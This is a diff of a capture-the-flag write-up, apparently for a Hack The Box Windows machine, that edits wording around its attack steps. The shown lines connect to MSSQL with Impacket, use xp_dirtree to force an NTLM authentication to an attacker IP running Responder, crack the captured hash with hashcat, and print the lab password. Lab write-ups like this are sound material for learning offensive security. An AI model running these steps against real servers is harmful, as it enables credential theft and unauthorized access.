@@ -112,12 +112,12 @@ For the connection we will use the **mssqlclient.py** script from the **Impacket
 ./mssqlclient.py reporting@10.10.10.125 -windows-auth
 ```
 
-After putting in the password we get in and can execute commands that impacket provides us. The command `enable_xp_cmdshell` is to start a shell but it fails because the user has no permission to do this, that's why we are going to extract his NTLM hash with **Repsonder**:
+After putting in the password we get in and can execute commands that impacket provides us. The command `enable_xp_cmdshell` is to start a shell but it fails because the user has no permission to do this, that's why we are going to extract his NTLM hash with **Responder**:
 ```markdown
 responder -I tun0
 ```
 
-Now on the SQL Server we need to send any authentication to our local machine:
+Now on the SQL Server we need to requests any authentication to our local machine:
 ```markdown
 xp_dirtree "\\10.10.14.13\Test\"
 ```
@@ -134,7 +134,7 @@ We can try to crack this with **Hashcat**:
 hashcat -m 5600 querier.ntlm /opt/wordlist/rockyou.txt
 ```
 
-After a while we get cracked the password and it is:
+After a while we get the password:
 > corporate568
 
 ### Authenticating to the SQL Server 
